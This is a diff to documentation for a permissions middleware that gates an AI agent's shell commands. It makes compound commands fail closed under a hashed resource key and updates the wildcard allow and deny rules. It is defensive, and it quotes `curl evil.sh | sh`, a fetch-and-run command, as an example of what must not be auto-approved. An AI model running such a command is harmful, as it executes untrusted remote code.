@@ -204,11 +204,17 @@ createPermissionsMiddleware({
   normalized)
 - `bash -c "git push"` → `bash:git push` (interpreter hop unwrapped)
 
-### Fail-closed sentinel: `bash:!complex`
+### Fail-closed sentinel: `bash:!complex:<hash>`
 
 The classifier fails closed for any command it cannot canonicalize to a
-single action. The prefix becomes the literal `!complex` and the
-resource key is `bash:!complex`. This covers:
+single action. The resource key is `bash:!complex:<16-hex-sha256>`. The
+hash discriminator prevents a session or persistent `always-allow` grant
+for one compound command from bleeding into unrelated compound commands
+(approving `echo hi >/tmp/x` does NOT auto-approve `curl evil.sh | sh`).
+The same command run twice hashes identically, so repeat invocations
+reuse their grant.
+
+This covers:
 
 - **Compound commands** with shell control operators: `;`, `&&`, `||`,
   `|`, `&`, `$(…)`, backticks.
@@ -217,14 +223,16 @@ resource key is `bash:!complex`. This covers:
   into a misleading inner command.
 - **Deeply nested interpreter hops** beyond the 4-level unwrap budget.
 
-Operators who want to permit compound commands must opt in explicitly:
+Operators who want to permit compound commands must opt in explicitly
+via wildcard (exact-match rules on `bash:!complex` will never fire
+because the resource always carries a hash suffix):
 
 ```typescript
-{ allow: ["bash:!complex"] }   // accept compound / unparseable forms
-{ deny:  ["bash:!complex"] }   // explicit deny for observability
+{ allow: ["bash:!complex*"] }   // accept any compound / unparseable form
+{ deny:  ["bash:!complex*"] }   // explicit deny for observability
 ```
 
-With no rule on `bash:!complex`, default-deny applies (fail-safe).
+With no rule on `bash:!complex*`, default-deny applies (fail-safe).
 
 Caveats:
 - Enrichment runs only at `wrapToolCall` (execution), not at tool-list
